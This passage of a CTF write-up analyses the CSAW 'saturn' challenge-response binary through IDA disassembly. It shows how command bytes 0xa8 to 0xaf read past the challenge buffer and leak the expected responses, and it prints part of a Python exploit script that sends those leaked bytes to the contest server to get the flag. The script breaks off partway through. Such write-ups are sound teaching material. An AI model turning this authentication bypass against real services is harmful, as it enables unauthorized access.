<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class="c"><span class="line"><span class="kt">int</span> <span class="nf">fillChallengeResponse</span><span class="p">();</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>They were nothing but a dummy function but it was enough to be able to run the binary without it terminating. </p>

<h2 id="the-application-structure">The application structure</h2>

<p>By doing some static analysis we determined that saturn was made of three main parts:</p>

<ul>
  <li>one responsible for providing the client a challenge</li>
  <li>one responsible for checking the response sent by the client to the server</li>
  <li>and the last one that would print out the flag if the response from the client was correct.</li>
</ul>

<p>The access to these 3 branches was handled by something similar to a case switch, where the layout of the buffer sent by the client was verified for a sequence of commands as follows:</p>

<ul>
  <li>if the first byte was in the range of 0xa0 to 0xaf the execution flow would get into the function responsible for providing the challenge to the client</li>
  <li>if the first byte was in the range of 0xe0 to 0xef the execution flow would get into the function responsible for checking the response</li>
  <li>if the first byte was a 0x80, the execution flow would get into the function responsible for printing the flag to stdout.</li>
</ul>

<p><img class="center" src="http://swappage.github.io/images/2014-09-24/caseswitch.png" /></p>

<p>At this point we knew that intended way to interact with the binary was to</p>

<ul>
  <li>send the command sequence to request a challenge</li>
  <li>send the response</li>
  <li>send the command to receive the flag</li>
</ul>

<h2 id="the-genchallenge-function">THe genChallenge() function</h2>

<p>Yes, i named it this way, in fact the binary was stripped, so while debugging using IDA i decided to rename it for making things easier :D
By the way… 
The second step was to closely verify how the function responsible for providing the challenge to the client actually worked</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
</pre></td><td class="code"><pre><code class="c-objdump"><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804885</span><span class="n">C</span>                 <span class="n">push</span>    <span class="n">ebp</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804885</span><span class="n">D</span>                 <span class="n">mov</span>     <span class="n">ebp</span><span class="p">,</span> <span class="n">esp</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">0804885F</span>                 <span class="n">push</span>    <span class="n">ebx</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048860</span>                 <span class="n">sub</span>     <span class="n">esp</span><span class="p">,</span> <span class="mi">34</span><span class="n">h</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048863</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">arg_0</span><span class="p">]</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048866</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_1C</span><span class="p">],</span> <span class="n">al</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048869</span>                 <span class="n">movzx</span>   <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_1C</span><span class="p">]</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804886</span><span class="n">D</span>                 <span class="n">and</span>     <span class="n">eax</span><span class="p">,</span> <span class="mf">0F</span><span class="n">h</span>			<span class="p">;</span> <span class="o">&lt;=====</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048870</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_11</span><span class="p">],</span> <span class="n">al</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048873</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="n">off_804A050</span>		<span class="p">;</span> <span class="o">&lt;=====</span>
</span><span class="line"><span class="p">...</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">B9</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">10</span><span class="n">h</span><span class="p">],</span> <span class="n">ebx</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">BD</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">0</span><span class="n">Ch</span><span class="p">],</span> <span class="n">ecx</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">C1</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="n">edx</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">C5</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="n">eax</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">C9</span>                 <span class="n">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span> <span class="n">offset</span> <span class="n">format</span> <span class="p">;</span> <span class="s">&quot;%c%c%c%c&quot;</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">D0</span>                 <span class="n">call</span>    <span class="n">_printf</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">D5</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="nl">ds</span><span class="p">:</span><span class="n">stdout</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">DA</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">esp</span><span class="p">],</span> <span class="n">eax</span>      <span class="p">;</span> <span class="n">stream</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">DD</span>                 <span class="n">call</span>    <span class="n">_fflush</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488E2</span>                 <span class="n">add</span>     <span class="n">esp</span><span class="p">,</span> <span class="mi">34</span><span class="n">h</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488E5</span>                 <span class="n">pop</span>     <span class="n">ebx</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488E6</span>                 <span class="n">pop</span>     <span class="n">ebp</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>We figured out that the challenge was read and returned to the client from a memory location controlled by the second digit of the byte, which meant that if we sent \xa0 we received 4 bytes, while if we were sending \xa1 we were receiving 4 other bytes.
This Part required a lot of testing and analysis by <em>talking</em> also to the real server, in fact we didn’t have the library that would generate the challenge/response, and therefore these memory locations were all 0.</p>

<p>After a couple of trial and error, and thanks to superkojiman’s smartness, we figured out that we could send a sequence of commands and read up to a total of 32 bytes of memory, by sending \xa0\xa1\xa2… and so on. (more on this later, as this is really important).</p>

<p>At this point we thought then, that the challenge, wasn’t composed of 4 bytes, but probably by 32.</p>

<h2 id="the-checkresponse-function">The checkResponse() function</h2>

<p>The check response function was the one responsible for actually verifying the validity of the response provided by the client.</p>

<p>To access this branch of code the client had to send the proper command, in the range of 0xe0 to 0xef followed by a sequence of 4 bytes representing (part) of the response.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
</pre></td><td class="code"><pre><code class="c-objdump"><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488E8</span>                 <span class="n">push</span>    <span class="n">ebp</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488E9</span>                 <span class="n">mov</span>     <span class="n">ebp</span><span class="p">,</span> <span class="n">esp</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">EB</span>                 <span class="n">sub</span>     <span class="n">esp</span><span class="p">,</span> <span class="mi">28</span><span class="n">h</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">EE</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">arg_0</span><span class="p">]</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488F</span><span class="mi">1</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_1C</span><span class="p">],</span> <span class="n">al</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488F</span><span class="mi">4</span>                 <span class="n">movzx</span>   <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_1C</span><span class="p">]</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488F</span><span class="mi">8</span>                 <span class="n">and</span>     <span class="n">eax</span><span class="p">,</span> <span class="mf">0F</span><span class="n">h</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488F</span><span class="n">B</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_15</span><span class="p">],</span> <span class="n">al</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488F</span><span class="n">E</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="n">off_804A054</span>		<span class="p">;</span> <span class="o">&lt;==</span> <span class="n">the</span> <span class="n">memory</span> <span class="n">location</span> <span class="n">from</span> <span class="n">which</span> <span class="n">the</span> <span class="n">response</span> <span class="n">is</span> <span class="n">read</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048903</span>                 <span class="n">movzx</span>   <span class="n">edx</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_15</span><span class="p">]</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048907</span>                 <span class="n">shl</span>     <span class="n">edx</span><span class="p">,</span> <span class="mi">2</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804890</span><span class="n">A</span>                 <span class="n">add</span>     <span class="n">eax</span><span class="p">,</span> <span class="n">edx</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804890</span><span class="n">C</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804890</span><span class="n">E</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_10</span><span class="p">],</span> <span class="n">eax</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048911</span>                 <span class="n">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="mi">4</span> <span class="p">;</span> <span class="n">nbytes</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048919</span>                 <span class="n">lea</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">buf</span><span class="p">]</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804891</span><span class="n">C</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="n">eax</span>    <span class="p">;</span> <span class="n">buf</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048920</span>                 <span class="n">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span> <span class="mi">0</span> <span class="p">;</span> <span class="n">fd</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048927</span>                 <span class="n">call</span>    <span class="n">_read</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804892</span><span class="n">C</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">buf</span><span class="p">]</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">0804892F</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_C</span><span class="p">],</span> <span class="n">eax</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048932</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_C</span><span class="p">]</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048935</span>                 <span class="n">cmp</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_10</span><span class="p">]</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048938</span>                 <span class="n">jz</span>      <span class="kt">short</span> <span class="n">loc_8048946</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804893</span><span class="n">A</span>                 <span class="n">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span> <span class="mi">0</span> <span class="p">;</span> <span class="n">status</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048941</span>                 <span class="n">call</span>    <span class="n">_exit</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048946</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048946</span> <span class="nl">loc_8048946</span><span class="p">:</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048946</span>                 <span class="n">movzx</span>   <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_15</span><span class="p">]</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804894</span><span class="n">A</span>                 <span class="n">mov</span>     <span class="nl">ds</span><span class="p">:</span><span class="n">dword_804A0A0</span><span class="p">[</span><span class="n">eax</span><span class="o">*</span><span class="mi">4</span><span class="p">],</span> <span class="mi">1</span>	<span class="p">;</span> <span class="o">&lt;==</span> <span class="k">if</span> <span class="n">bytes</span> <span class="n">are</span> <span class="n">correct</span> <span class="n">this</span> <span class="n">memory</span> <span class="n">location</span> <span class="n">is</span> <span class="n">set</span> <span class="n">to</span> <span class="mi">1</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048955</span>                 <span class="n">leave</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048956</span>                 <span class="n">retn</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Again, we missed the library responsible for generating the challenge response, so everything was 0 to us yet we could figure out that</p>

<ul>
  <li>if the bytes were correct the memory location at address <em>dword_804A0A0[eax</em>4]* was set to 1</li>
  <li>if the bytes were wrong exit() was called instead causing the application to terminate.</li>
</ul>

<p>At this point that was all we knew, as we were still missing an important part of the puzzle, which comes into play when the function that is supposed to finally open and read the flag for us is called.</p>

<h2 id="a-matter-of-cycling">A matter of cycling</h2>

<p>We thought we were really close to solving the puzzle, but we were obviously proved wrong.</p>

<p>If we take a look at the graph of the function responsible of opening the flag.txt file and then writing it to stdout, we can notice that there is a funny and evil function which i decided to name Cycles()</p>

<p><img class="center" src="http://swappage.github.io/images/2014-09-24/openfile.png" /></p>

<p>Apparantly it looks like that depending on the return value of that function, we would or wouldn’t be able to read the flag.</p>

<p>Let’s give a quick look at the function</p>

<p><img class="center" src="http://swappage.github.io/images/2014-09-24/cycles.png" /></p>

<p>The concept is as simple as this:</p>

<ul>
  <li>the function cycles 8 times using the address pointed by ebp+var_4 as counter</li>
  <li>at first it zeroes out EAX</li>
  <li>then it moves the value from the memory location at address dword_804A0A0[eax*4 into EAX</li>
  <li>and it multiplies EAX by EBP+var_8 (which is always 1)</li>
  <li>at the end of the 8 iterations it returns the value in EAX</li>
</ul>

<p>So, considering that to get to read the flag, the only way to do that was for this function to return 1, that meant that EAX had to be 1 after the 8 cycles ended
At this point the only way, was to have dword_804A0A0[eax*4 to contain 1.</p>

<p>But wait, where did i see this address before? it looks familiar…</p>

<p>If we get back to the function that checks the response (the one accessed by sending \xeN) we notice that the memory location is exactly the same</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
</pre></td><td class="code"><pre><code class="c-objdump"><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048946</span>                 <span class="n">movzx</span>   <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_15</span><span class="p">]</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804894</span><span class="n">A</span>                 <span class="n">mov</span>     <span class="nl">ds</span><span class="p">:</span><span class="n">dword_804A0A0</span><span class="p">[</span><span class="n">eax</span><span class="o">*</span><span class="mi">4</span><span class="p">],</span> <span class="mi">1</span>	<span class="p">;</span> <span class="o">&lt;==</span> <span class="k">if</span> <span class="n">bytes</span> <span class="n">are</span> <span class="n">correct</span> <span class="n">this</span> <span class="n">memory</span> <span class="n">location</span> <span class="n">is</span> <span class="n">set</span> <span class="n">to</span> <span class="mi">1</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048955</span>                 <span class="n">leave</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048956</span>                 <span class="n">retn</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
</pre></td><td class="code"><pre><code class="c-objdump"><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048803</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_4</span><span class="p">]</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048806</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="nl">ds</span><span class="p">:</span><span class="n">dword_804A0A0</span><span class="p">[</span><span class="n">eax</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>	<span class="p">;</span> <span class="o">&lt;==</span> <span class="k">if</span> <span class="n">this</span> <span class="n">is</span> <span class="mi">1</span><span class="p">,</span> <span class="n">eax</span> <span class="n">is</span> <span class="mi">1</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804880</span><span class="n">D</span>                 <span class="n">mov</span>     <span class="n">edx</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_8</span><span class="p">]</span>
</span><span class="line"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048810</span>                 <span class="n">imul</span>    <span class="n">eax</span><span class="p">,</span> <span class="n">edx</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>
<p>In the end, the purpose of this function then, was to perform a further check and see if the <strong>whole</strong> response was correct.. wait, what? the WHOLE? (more on this later)</p>

<h2 id="how-we-saw-the-light-at-the-end-of-the-tunnel">How we saw the light at the end of the tunnel</h2>

<p>At this point everything was starting to make sense, but we were missing a point..
then all of a sudden we began to mumble about those 8 iterations</p>

<p><em>8 iterations.. 8 iterations… but what if?…</em></p>

<p>And that’s how a simple guessing can lead to the solution, what if we needed to send 8 chunks of 4 bytes and build a whole response?
we thought, then that bitwise AND would make sense, we were able to get a total of 32 bytes of challenge from the server, maybe it’s expecting us to send it 32 bytes, in chunk of 4.</p>

<p>we quickly tried that out by building a buffer that would at first pull 32 bytes of challenge 4 bytes at a time</p>

<pre><code>\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7
</code></pre>

<p>and then send the response with</p>

<pre><code>"\xe0" + &lt;the four bytes received from \xa0&gt; + "\xe1" + &lt;the 4 bytes received from \xa1&gt;.....*
</code></pre>

<p>and punched it to the server.. DAMN, no luck, it didn’t work!
yet we were so close..</p>

<p>Then at a certain point, Barrebas, who was sitting silent working on reversing the binary said…</p>

<p><em>“Wait.. the response is checked starting at a memory location that is 32 bytes away from where the challenge is read from”</em></p>

<p>We saw the light! :D
we remembered that we could send commands from \xa0 to \xaf, which probably meant we could read past the 32 bytes of the challenge… what if we tried to verify with \xe0 the output from \xa8, and all the way onward to \xe7 with \xaf?</p>

<p>That would have probably sent the expected response to the server for each challenge request.. we tried and..
BAM! we got the flag!</p>

<pre><code># ./updated.py
CSAW ChallengeResponseAuthenticationProtocol Flag Storage

flag{greetings_to_pure_digital}
</code></pre>

<p>Here is the script we used as exploit to retrieve the flag from the server</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="c">#!/usr/bin/env python</span>
</span><span class="line">
</span><span class="line"><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class="line"><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">struct</span>
</span><span class="line"><span class="kn">import</span> <span class="nn">time</span>
</span><span class="line">
</span><span class="line"><span class="n">target</span> <span class="o">=</span> <span class="s">&quot;54.85.89.65&quot;</span>
</span><span class="line"><span class="c">#target = &quot;127.0.0.1&quot;</span>
</span><span class="line">
</span><span class="line"><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class="line"><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span> <span class="mi">8888</span><span class="p">))</span>
</span><span class="line">
</span><span class="line"><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>  <span class="c"># banner </span>
</span><span class="line">
</span><span class="line"><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\xa8\xa9\xaa\xab\xac\xad\xae\xaf</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class="line"><span class="n">c0</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>        <span class="c"># challenge 0 </span>
</span><span class="line"><span class="n">c1</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>        <span class="c"># challenge 1 </span>
</span><span class="line"><span class="n">c2</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>        <span class="c"># challenge 2 </span>
</span><span class="line"><span class="n">c3</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>        <span class="c"># challenge 3 </span>
</span><span class="line"><span class="n">c4</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>        <span class="c"># challenge 4 </span>
</span><span class="line"><span class="n">c5</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>        <span class="c"># challenge 5 </span>
</span><span class="line"><span class="n">c6</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>        <span class="c"># challenge 6 </span>
</span><span class="line"><span class="n">c7</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>        <span class="c"># challenge 7 </span>
</span><span class="line">
</span><span class="line"><span class="n">challenge</span> <span class="o">=</span> <span class="n">c0</span> <span class="o">+</span> <span class="n">c1</span> <span class="o">+</span> <span class="n">c2</span> <span class="o">+</span> <span class="n">c3</span> <span class="o">+</span> <span class="n">c4</span> <span class="o">+</span> <span class="n">c5</span> <span class="o">+</span> <span class="n">c6</span> <span class="o">+</span> <span class="n">c7</span>
</span><span class="line">
</span><span class="line"><span class="n">buf</span> <span class="o">=</span> <span class="p">(</span>
</span><span class="line"><span class="s">&quot;</span><span class="se">\xe0</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">c0</span> <span class="o">+</span>
</span><span class="line"><span class="s">&quot;</span><span class="se">\xe1</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">c1</span> <span class="o">+</span>
</span><span class="line"><span class="s">&quot;</span><span class="se">\xe2</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">c2</span> <span class="o">+</span>
</span><span class="line"><span class="s">&quot;</span><span class="se">\xe3</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">c3</span> <span class="o">+</span>
</span><span class="line"><span class="s">&quot;</span><span class="se">\xe4</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">c4</span> <span class="o">+</span>
</span><span class="line"><span class="s">&quot;</span><span class="se">\xe5</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">c5</span> <span class="o">+</span>
</span><span class="line"><span class="s">&quot;</span><span class="se">\xe6</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">c6</span> <span class="o">+</span>
</span><span class="line"><span class="s">&quot;</span><span class="se">\xe7</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">c7</span> <span class="o">+</span>
